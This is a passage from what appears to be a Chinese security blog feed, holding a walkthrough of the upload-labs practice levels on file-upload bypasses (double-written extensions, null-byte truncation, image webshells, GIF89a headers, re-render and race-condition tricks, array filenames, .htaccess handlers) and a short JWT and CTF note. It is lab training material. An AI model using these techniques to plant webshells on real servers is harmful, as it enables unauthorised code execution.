class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>        </code></pre><p>可以看到,$file_name中的后缀只要是在$deny_ext中的,都会被空格替换</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191201164020476.png" alt="image-20191201164020476"></p><p>pphphphpp 双写即可绕过</p><h2 id="Pass-11-文件路径可控-使用00截断绕过"><a href="#Pass-11-文件路径可控-使用00截断绕过" class="headerlink" title="Pass-11(文件路径可控,使用00截断绕过)"></a>Pass-11(文件路径可控,使用00截断绕过)</h2><p>查看提示,发现<strong>文件路径是可控的</strong>,于是可以使用00截断的方法来绕过</p><blockquote><p>常见的截断有0x00，%00，/00</p><p>00截断的原理:截断的核心，就是chr(0)这个字符</p><p>先说一下这个字符，这个字符不为空(Null)，也不是空字符(“”)，更不是空格！</p><p>当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生</p><p><a href="https://zhuanlan.zhihu.com/p/30005652" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/30005652</a></p><p>第二篇文章讲的更好</p><p><a href="http://www.admintony.com/关于上传中的00截断分析.html" target="_blank" rel="noopener">http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html</a></p></blockquote><pre class=" language-php"><code class="language-php"><span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span></code></pre><p>看源码,发现是通过<strong>GET方法</strong>将路径和文件名拼接在一起的,我们可以在get的文件路径中使用截断绕过,然后在filename中上传合法的文件</p><p><strong>能够利用截断这一漏洞必须使magic_quotes_gpc=off,并且PHP版本小于5.3.29</strong></p><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-7243" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-7243</a></p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191201234516228.png" alt="image-20191201234516228"></p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191201234648070.png" alt="image-20191201234648070"></p><p>然后访问src属性中的文件地址,可以看到phpinfo界面,说明文件上传成功,并且PHP代码被执行</p><h2 id="Pass-12-POST方式的00截断"><a href="#Pass-12-POST方式的00截断" class="headerlink" title="Pass-12(POST方式的00截断)"></a>Pass-12(POST方式的00截断)</h2><p>POST方式的00截断需要在HEX中在上传的文件后缀php后面的hex值改为00</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191202002116344.png" alt="image-20191202002116344"></p><h2 id="Pass-13-图片马绕过检测-文件包含执行webshell"><a href="#Pass-13-图片马绕过检测-文件包含执行webshell" class="headerlink" title="Pass-13(图片马绕过检测,文件包含执行webshell)"></a>Pass-13(图片马绕过检测,文件包含执行webshell)</h2><h3 id="图片马的制作"><a href="#图片马的制作" class="headerlink" title="图片马的制作:"></a>图片马的制作:</h3><p>方法一:cmd中输入命令 </p><pre><code>copy 源图片.jpg/b+源php文件.php  图片马.jpg</code></pre><p>图片马.jpg 就是我们想要的</p><p>方法二:用misc隐写软件010editor</p><p>将图片拖进去,然后在底部添加webshell</p><p>本地文件包含,直接在file的参数后写入文件名</p><p>远程文件包含(RFI)必须 </p><p>allow_url_fopen=on</p><p>allow_url_include=on</p><p><a href="https://chybeta.github.io/2017/10/08/php文件包含漏洞/" target="_blank" rel="noopener">https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></p><p>传好了之后,利用文件包含,?file=../upload/文件名执行里面的PHP代码</p><h2 id="Pass-14-文件头绕过"><a href="#Pass-14-文件头绕过" class="headerlink" title="Pass-14(文件头绕过)"></a>Pass-14(文件头绕过)</h2><p>源代码调用了<strong>getimagesize()函数来判断文件类型</strong></p><p>因此只需要传一个图片马 </p><p><strong>GIF89a</strong>文件头 来绕过</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><strong>exif_imagetype()</strong> 读取一个图像的第一个字节并检查其签名。需要开启php_exif模块</p><p>GIF89a 文件头绕过</p><h2 id="Pass-16-二次渲染绕过"><a href="#Pass-16-二次渲染绕过" class="headerlink" title="Pass-16(二次渲染绕过)"></a>Pass-16(二次渲染绕过)</h2><p>第一次我们将PHP代码插到图片的内容底部</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191202151754861.png" alt="image-20191202151754861"></p><p>上传成功后,访问新生成的路径,将图片保存下来</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191202151855235.png" alt="image-20191202151855235"></p><p>发现我们的PHP代码被二次渲染了</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191202152111594.png" alt="image-20191202152111594"></p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191202152122095.png" alt="image-20191202152122095"></p><p>对比上传前和上传后的两张图片,发现没有被渲染的部分,也就是内容前部分(到00000180)都没变化,于是把PHP代码写进去,就不会被渲染了,然后成功传上去,访问这个图片地址,使其执行我们的PHP代码</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191202152443977.png" alt="image-20191202152443977"></p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191202152523604.png" alt="image-20191202152523604"></p><p>然后把新传上去的图片报错,查看一下</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191202153122170.png" alt="image-20191202153122170"></p><p>PHP代码正常,成功了</p><h2 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17(条件竞争)"></a>Pass-17(条件竞争)</h2><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>其中的这一行代码</p><pre class=" language-php"><code class="language-php"> <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>把文件路径重命名了</p><p>然后通过</p><pre class=" language-PHP"><code class="language-PHP">unlink($upload_file);</code></pre><p>unlink删除我们传上去的文件</p><p>条件竞争漏洞(<a href="https://blog.csdn.net/qq_26406447/article/details/90749288" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/90749288</a>)</p><p>简单来说:就是先检查安全性,如果不安全就把删除了,所以这里就可以利用,我们在<strong><em>服务器在把文件删除之前把webshell传上去</em></strong>,然后就成功了</p><p>有两种方法,一种是用python写脚本,由于我python还是小白,我遇到这种点,都是用bp的intruder发起两次attack…..一个是不断的上传webshell,另一个是不断的访问含有上传文件的路径使其执行里面的PHP代码</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191202223415201.png" alt="image-20191202223415201"></p><p>这里payload设置的是不影响执行结果的UA</p><p>然后payload设置为Null,因为这样更快,然后线程要大.更能抓住服务器处理不安全文件的间隙</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191202223534535.png" alt="image-20191202223534535"></p><h2 id="Pass-18-上传压缩文件-条件竞争"><a href="#Pass-18-上传压缩文件-条件竞争" class="headerlink" title="Pass-18(上传压缩文件+条件竞争)"></a>Pass-18(上传压缩文件+条件竞争)</h2><pre class=" language-php"><code class="language-php"><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">"./myupload.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>看到这里存在文件包含</p><p>这关并且对文件的大小做出了限制,定义了一个MyUpload()类,里面定义了可以上传的文件类型</p><p>类里面的方法设置了文件路径,检查扩展名,检查文件的大小.,检查文件是否存在</p><p>我们看白名单有哪些内容</p><pre class=" language-php"><code class="language-php"><span class="token keyword">var</span> <span class="token variable">$cls_arr_ext_accepted</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>      <span class="token string">".doc"</span><span class="token punctuation">,</span> <span class="token string">".xls"</span><span class="token punctuation">,</span> <span class="token string">".txt"</span><span class="token punctuation">,</span> <span class="token string">".pdf"</span><span class="token punctuation">,</span> <span class="token string">".gif"</span><span class="token punctuation">,</span> <span class="token string">".jpg"</span><span class="token punctuation">,</span> <span class="token string">".zip"</span><span class="token punctuation">,</span> <span class="token string">".rar"</span><span class="token punctuation">,</span> <span class="token string">".7z"</span><span class="token punctuation">,</span><span class="token string">".ppt"</span><span class="token punctuation">,</span>      <span class="token string">".html"</span><span class="token punctuation">,</span> <span class="token string">".xml"</span><span class="token punctuation">,</span> <span class="token string">".tiff"</span><span class="token punctuation">,</span> <span class="token string">".jpeg"</span><span class="token punctuation">,</span> <span class="token string">".png"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>发现除了常见的图片后缀等,但是多了zip,rar压缩文件.</p><p>这里可以传一个php文件,然后改后缀为111.php.zip 或者 111.php.rar ,  111.php.7z</p><p>然后去访问含有这个文件的路径去执行</p><p>因为存在重命名,并且在代码的最后部分</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cls_rename_file</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">renameFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    </code></pre><p>因此我传一个压缩文件,里面含有PHP代码,然后在重命名之前去访问执行,然后就成功了</p><h2 id="Pass-19-多种方式都可以绕过"><a href="#Pass-19-多种方式都可以绕过" class="headerlink" title="Pass-19(多种方式都可以绕过)"></a>Pass-19(多种方式都可以绕过)</h2><blockquote><p>查看题目提示,本pass的取文件名通过$_POST来获取。</p></blockquote><p>然后就上传一个php文件</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191202234450479.png" alt="image-20191202234450479"></p><p>访问上传的图片</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191202234528115.png" alt="image-20191202234528115"></p><p>PHP代码被执行了</p><p>成功了</p><p>然后做出来了之后,看了一下源码,发现这道题过滤设置的好简单,还可以用大小写绕过</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191202234907256.png" alt="image-20191202234907256"></p><p>最致命的一个点就是直接把文件名称拼接在文件路径中了,没有重命名,也没有过滤特殊(Windows特性”.” 和 $::DATA 加空格 都可以绕过</p><pre class=" language-php"><code class="language-php"><span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span></code></pre><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>查看提示发现要代码审计,那就审吧</p><p>是POST方法,于是可以改文件名</p><p>先检查MIME 头,也就是媒体文件类型检查</p><p>发现只能上传图片类型的image/jpeg’,’image/png’,’image/gif</p><p>然后检查文件名,把文件后缀进行统一小写处理</p><p>其中有一个reset()</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191203000410194.png" alt="image-20191203000410194"></p><p>count()函数返回数组中元素的个数</p><p>end() 函数将内部指针指向数组中的最后一个元素，并输出。</p><pre class=" language-php"><code class="language-php"> <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>这里把元素的个数进行了-1处理</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//检查MIME</span>    <span class="token variable">$allow_type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'image/jpeg'</span><span class="token punctuation">,</span><span class="token string">'image/png'</span><span class="token punctuation">,</span><span class="token string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//允许上传的媒体类型</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$allow_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"禁止上传该类型文件!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//检查文件名</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token comment" spellcheck="true">//检查是否为数组,如果不是,就用explode打撒</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$allow_suffix</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$allow_suffix</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"禁止上传该后缀文件!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"文件上传成功！"</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"文件上传失败！"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"请选择要上传的文件！"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里因为对文件名进行了数组化并用了explode()函数,于是可以把文件名数组化绕过</p><blockquote><p>这道题也是看了WP…第一次遇到,没思路只能怪自己PHP学的不够好</p></blockquote><h1 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h1><p>检测文件类型分两种,一种是客户端通过Javascrip检测,第二种是在服务器端检测</p><h2 id="客户端检测"><a href="#客户端检测" class="headerlink" title="客户端检测"></a>客户端检测</h2><p>找到检测文件类型的JS函数,在控制台中把函数里面的代码块设置为空,使这个函数失效</p><p>另一种方式就是传一个允许上传的文件上去,通过bp抓包然后改回来就成功了</p><h2 id="服务器端检测"><a href="#服务器端检测" class="headerlink" title="服务器端检测"></a>服务器端检测</h2><p>服务器端检测分为:content-type检测,MIME头检测,后缀检测,内容检测,二次渲染,用explode函数把文件名打散</p><p>绕过方式:改为允许的conten-type</p><p>服务器端检测后缀名:分为白名单检测和黑名单检测</p><p>改为可执行的其他后缀(大写,双写,加空格,文件名拼接绕过,Windows特性,00截断(文件路径可控))</p><p>Apache解析漏洞:如果没有限制上传.htaccess文件.[<strong>SetHandler application/x-httpd-php</strong>]可以上传一个上去,然后我们传一个白名单中允许的文件进去,就成功了</p><p>图片马:一种可以加GIF头 GIF89a</p><p>另一种是制作图片马,即在真的一张图片中写入webshell</p><p>二次渲染: 二次顾名思义,把第一次传上去的文件经过服务器的一系列处理后,然后再下载到本地,对比前后哪些地方没有发生改变的部分,在这部分内容中继续写人php代码,再第二次传上去,访问这张图片,执行,就成功了</p><p>条件竞争(逻辑漏洞):在服务器还未来得及处理危险文件之前,就成功访问了危险文件,执行了webshell</p><p>数组绕过:把文件名在响应头中以数组的方式,分解传上去,数组中最后一个为白名单中可以上传的文件后缀</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Uoload-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSON Web Token</title>
      <link href="/posts/20191201/"/>
      <url>/posts/20191201/</url>
      
        <content type="html"><![CDATA[<h1 id="JSON-Web-Token-JWT"><a href="#JSON-Web-Token-JWT" class="headerlink" title="JSON Web Token(JWT)"></a>JSON Web Token(JWT)</h1><p> <a href="https://segmentfault.com/a/1190000010312468" target="_blank" rel="noopener">https://segmentfault.com/a/1190000010312468</a> </p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>以token的方式代替传统的Cookie-Session模式,用于服务器,客户端传递信息签名验证</p><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><h3 id="头部-header"><a href="#头部-header" class="headerlink" title="头部(header)"></a>头部(header)</h3><pre><code>{    &quot;typ&quot;:&quot;JWT&quot; //声明类型为jwt    &quot;aig&quot;:&quot;HS256&quot; //声明签名算法为SHA256}</code></pre><h3 id="载荷-payload-签证-signature"><a href="#载荷-payload-签证-signature" class="headerlink" title="载荷(payload) , 签证(signature)"></a>载荷(payload) , 签证(signature)</h3><a id="more"></a><pre><code>{    &quot;iss&quot;:&quot;  &quot; //JWT 签发者    &quot;aud&quot;:&quot;  &quot; //接受JWT的一方    &quot;sub&quot;:&quot;  &quot; // jwt所面向的用户    &quot;iat&quot;:&quot;  &quot; // 签发时间    &quot;nbf&quot;:&quot;  &quot; //定义在什么时候之前或之后能访问    &quot;exp&quot;:&quot;  &quot; //jwt的过期时间(必须大于签发时间)    &quot;jti&quot;:&quot;  &quot; //jwt唯一身份标识,主要用来一次性token    &quot;account&quot;: &quot;  &quot; //}</code></pre><p><strong>三个部分以  .  隔开</strong> ,在得到token的时候,想要获取具体jwt信息,还需要base64解码</p><p>JWT 包 :fire:Firebase等</p><p>导入方式:\Firebase\JWT\JWT;</p><p>vim命令恢复swp文件</p><p>vim -r xxx(文件名) </p><h1 id="CTF论剑场-Web-10"><a href="#CTF论剑场-Web-10" class="headerlink" title="CTF论剑场 Web 10"></a>CTF论剑场 Web 10</h1><p><img src="/posts/20191201/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191125213059782.png" alt="image-20191125213059782"></p><p><img src="/posts/20191201/C:%5CUsers%5C32028%5CDesktop%5C1%5Cimage-20191125213137490.png" alt="image-20191125213137490"></p><p><img src="/posts/20191201/C:%5CUsers%5C32028%5CDesktop%5C1%5Cimage-20191125214508267.png" alt="image-20191125214508267"></p><p>然后这里是把cookie的名称设置了为token</p><p><img src="/posts/20191201/C:%5CUsers%5C32028%5CDesktop%5C1%5Cimage-20191125225112034.png" alt="image-20191125225112034"></p><p><img src="/posts/20191201/C:%5CUsers%5C32028%5CDesktop%5C1%5Cimage-20191125225127556.png" alt="image-20191125225127556"></p><p>设置好发包时间,选择相应的时间戳(就是在BP中GO的时间)</p><p><img src="/posts/20191201/C:%5CUsers%5C32028%5CDesktop%5C1%5Cimage-20191125225214261.png" alt="image-20191125225214261"></p><p>通过本题,我学习了JSON Web Token, 了解了时间戳的用法</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第十届极客大挑战Writeup</title>
      <link href="/posts/20191130/"/>
      <url>/posts/20191130/</url>
      
